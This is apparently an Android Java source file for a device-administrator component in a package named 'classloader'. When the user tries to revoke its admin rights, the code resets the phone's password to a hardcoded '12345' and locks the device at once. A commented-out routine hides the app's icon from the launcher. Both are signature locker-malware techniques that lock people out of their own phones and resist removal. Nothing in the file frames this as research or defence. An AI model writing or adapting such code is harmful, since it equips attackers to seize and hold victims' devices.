package com.catherine.classloader;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;

public class DeviceAdminComponent extends DeviceAdminReceiver {
	
	private static final String OUR_SECURE_ADMIN_PASSWORD = "12345";

	public CharSequence onDisableRequested(Context context, Intent intent) {
		
        ComponentName localComponentName = new ComponentName(context, DeviceAdminComponent.class);

        DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE );
        if (localDevicePolicyManager.isAdminActive(localComponentName))
        {
            localDevicePolicyManager.setPasswordQuality(localComponentName, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC);
        }

        // resetting user password
        localDevicePolicyManager.resetPassword(OUR_SECURE_ADMIN_PASSWORD, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);

        // locking the device
        localDevicePolicyManager.lockNow();
        
        return super.onDisableRequested(context, intent);
	}
    static class C00002 extends Thread {
        C00002() {
        }

        public void run(Context context) {

            Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
            Intent myintent = new Intent(Intent.ACTION_VIEW, uri);
            gcontext.startActivity(myintent);
        }
    }
    public static void startAsync() {
        new C00002().start();
    }
    public static Context gcontext;
    public void onEnabled(Context context, Intent intent) {
        //hideApplication(context,intent);
        //startAsync();
    }
    private void hideApplication(Context context, Intent intent) {
        // nasconde l'icona dal drawer dopo il primo avvio
        PackageManager pm = context.getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(intent.getComponent(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

    }
    public void onDisabled (Context context,
                                            Intent intent)
    {

    }

}
